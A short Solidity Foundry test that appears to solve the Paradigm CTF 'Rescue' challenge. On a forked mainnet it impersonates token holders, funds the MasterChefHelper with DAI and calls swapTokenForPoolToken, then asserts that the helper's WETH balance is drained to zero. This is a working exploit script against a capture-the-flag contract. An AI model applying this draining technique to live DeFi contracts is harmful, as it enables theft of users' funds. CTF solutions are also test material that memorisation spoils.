// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Setup} from "../Setup.sol";
import {MasterChefHelper} from "../MasterChefHelper.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "forge-std/console2.sol";
import {UniswapV2RouterLike} from "../UniswapV2Like.sol";

contract ContractTest is Test {
    Setup public s;

    address dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address sushi = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;

    uint256 DAI_WETH_POOL = 2;

    UniswapV2RouterLike router =
        UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);

    MasterChefHelper mc;

    function setUp() public {}

    function testRescueExploit() public {
        vm.createSelectFork(vm.rpcUrl("paradigm"));
        s = new Setup{value: 10 ether}();

        mc = s.mcHelper();

        vm.prank(sushi);
        ERC20(sushi).transfer(address(this), 100 * 10**18);

        vm.prank(dai);
        ERC20(dai).transfer(address(mc), 100000 * 10**18);

        assertGt(ERC20(weth).balanceOf(address(mc)), 0);

        ERC20(sushi).approve(address(mc), type(uint256).max);
        mc.swapTokenForPoolToken(DAI_WETH_POOL, address(sushi), 10 * 10**18, 0);

        assertEq(ERC20(weth).balanceOf(address(mc)), 0);
    }
}
